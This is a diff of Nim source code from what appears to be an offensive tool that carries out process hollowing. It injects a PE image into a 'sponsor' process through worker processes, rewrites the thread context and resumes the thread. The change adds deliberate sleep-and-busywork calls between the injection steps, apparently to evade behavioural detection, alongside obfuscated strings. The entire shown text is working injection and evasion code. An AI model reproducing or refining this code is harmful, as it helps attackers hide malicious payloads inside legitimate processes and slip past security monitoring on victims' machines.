@@ -316,7 +316,7 @@ proc createProcessWorker(arg: string, sponsorHandle: HANDLE): PPROCESS_INFORMATI
     return addr pi
 
 
-proc hollow456Manager*(peStr: string, sponsorProcessInfo: PPROCESS_INFORMATION): bool =
+proc hollow456Manager*(peStr: string, sponsorProcessInfo: PPROCESS_INFORMATION, sleepBetweenSteps: int): bool =
     
     # Extract process information
     let sponsorProcessHandle = sponsorProcessInfo.hProcess
@@ -342,6 +342,8 @@ proc hollow456Manager*(peStr: string, sponsorProcessInfo: PPROCESS_INFORMATION):
     if mailslotHandle == 0:
         onFail(sponsorProcessHandle)
 
+    sleepUselessCalculations(sleepBetweenSteps)
+
     # Allocate memory in sponsor process
     when not defined(release): echo "[*] Allocating memory in sponsor process"     
     ppi = createProcessWorker(protectString(" -A:") & $sponsorProcessHandle, sponsorProcessHandle)
@@ -354,6 +356,8 @@ proc hollow456Manager*(peStr: string, sponsorProcessInfo: PPROCESS_INFORMATION):
     # Get the allocated address from the allocator process
     let newImageBaseAddress = cast[PVOID](parseInt(readMailslot(mailslotHandle)))
     when not defined(release): echo "[i] New image base address: 0x" & $cast[int](newImageBaseAddress).toHex 
+    
+    sleepUselessCalculations(sleepBetweenSteps)
 
     # Copy PE to sponsor process 
     when not defined(release): echo "[*] Copying PE to sponsor process"
@@ -367,6 +371,8 @@ proc hollow456Manager*(peStr: string, sponsorProcessInfo: PPROCESS_INFORMATION):
         when not defined(release): echo "[-] Could not write to sponsor process"
         onFail(sponsorProcessHandle)
 
+    sleepUselessCalculations(sleepBetweenSteps)
+
     # Change sponsor thread Entrypoint
     when not defined(release): echo "[*] Changing thread context"
     ppi = createProcessWorker(
@@ -379,6 +385,8 @@ proc hollow456Manager*(peStr: string, sponsorProcessInfo: PPROCESS_INFORMATION):
         when not defined(release): echo "[-] Could not change thread context"
         onFail(sponsorProcessHandle)
 
+    sleepUselessCalculations(sleepBetweenSteps)
+    
     # Resume remote thread 
     when not defined(release): echo "[*] Resuming thread"
     ppi = createProcessWorker(protectString(" -R:") & $sponsorThreadHandle, sponsorProcessHandle)
@@ -390,7 +398,7 @@ proc hollow456Manager*(peStr: string, sponsorProcessInfo: PPROCESS_INFORMATION):
 
  
 proc hollow456Worker*(peStr: string): bool =
-  
+
     # Parse PE
     var peBytes = @(peStr.toOpenArrayByte(0, peStr.high))
     var peBytesPtr = addr peBytes[0]
